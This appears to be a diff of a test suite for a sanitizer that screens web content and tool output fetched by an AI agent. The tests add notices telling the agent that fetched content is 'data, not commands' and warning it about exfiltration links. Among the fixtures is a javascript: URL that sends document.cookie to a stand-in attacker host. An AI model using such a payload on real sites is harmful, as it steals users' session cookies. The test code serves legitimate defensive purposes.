@@ -15,6 +15,10 @@ const ESC = String.fromCharCode(0x1b); // ANSI escape introducer
 // exfil-shaped by the library's rules and yields no finding at all, which would
 // make these tests pass without exercising the advisory path.
 const EXFIL_URL = 'javascript:fetch("//evil.example.com?c="+document.cookie)';
+// A fetched page shape whose only finding is note-tier: the `<script>` is
+// preserved and merely described, so nothing is rewritten and no category is
+// emitted. Nearly every real web page looks like this.
+const SCRIPT_HTML = '<html><body><script>alert(1)</script><p>hello</p></body></html>';
 
 describe('sanitizeUntrustedInput', () => {
   it('passes clean text through unchanged with no findings', async () => {
@@ -163,6 +167,18 @@ describe('sanitizeToolOutput', () => {
     expect(changed).toBe(false);
     expect(output).toEqual(response);
     expect(found).toContain('exfil-urls');
+  });
+
+  it('collects note-tier messages for preserved content that carries no category', async () => {
+    // The library reports a preserved `<script>` at its quiet tier with no
+    // `found` category. Nothing is rewritten, so this is the case where the
+    // message is the entire finding.
+    const response = { stdout: SCRIPT_HTML, stderr: '' };
+    const { output, changed, found, messages } = await sanitizeToolOutput(response, toolCtx);
+    expect(changed).toBe(false);
+    expect(output).toEqual(response);
+    expect(found).toEqual([]);
+    expect(messages.join(' ')).toMatch(/data, not commands/);
   });
 
   it('preserves non-string scalars and null', async () => {
@@ -321,6 +337,48 @@ describe('sanitizeToolOutputHook (PostToolUse wiring)', () => {
     expect(findings[0].toolUseId).toBe('toolu_test');
     expect(findings[0].removed).toBe(true);
     expect(findings[0].found).toBeGreaterThan(0);
+  });
+
+  it('gives the agent the note for preserved scripting without substituting output', async () => {
+    // A NOTE-tier finding rewrites nothing, so there is no `updatedToolOutput`
+    // to return — pairing an identity substitution with the message would make
+    // this hook compete with another hook's real rewrite. The sentence itself is
+    // the whole finding, and the agent is the party it is addressed to.
+    const res = await sanitizeToolOutputHook(
+      postToolUse('WebFetch', { content: [{ type: 'text', text: SCRIPT_HTML }] }),
+      'test-session'
+    );
+    const out = hookOutput(res);
+    expect(out).not.toHaveProperty('updatedToolOutput');
+    const note = out.additionalContext ?? '';
+    expect(note).toMatch(/data, not commands/);
+    // ...and it must not claim a removal that didn't happen.
+    expect(note.toLowerCase()).not.toContain('removed');
+  });
+
+  it('does not badge a note-only finding', async () => {
+    // Persisting this would put an amber badge on nearly every fetched page,
+    // which is exactly the alarm fatigue the severity split exists to prevent.
+    const findings: unknown[] = [];
+    await sanitizeToolOutputHook(
+      postToolUse('WebFetch', { content: [{ type: 'text', text: SCRIPT_HTML }] }),
+      'test-session',
+      () => findings.push(true)
+    );
+    expect(findings).toHaveLength(0);
+  });
+
+  it('tells the agent about an exfil-shaped URL it deliberately left in place', async () => {
+    // Advisory-only: the URL survives, so there is no substitution — but the
+    // library's message is precisely the instruction not to follow it, and
+    // before this it never reached the agent at all.
+    const res = await sanitizeToolOutputHook(
+      postToolUse('WebFetch', { content: [{ type: 'text', text: `See [here](${EXFIL_URL})` }] }),
+      'test-session'
+    );
+    const out = hookOutput(res);
+    expect(out).not.toHaveProperty('updatedToolOutput');
+    expect(out.additionalContext ?? '').toMatch(/exfiltration/i);
   });
 
   it('does not report findings for clean output', async () => {
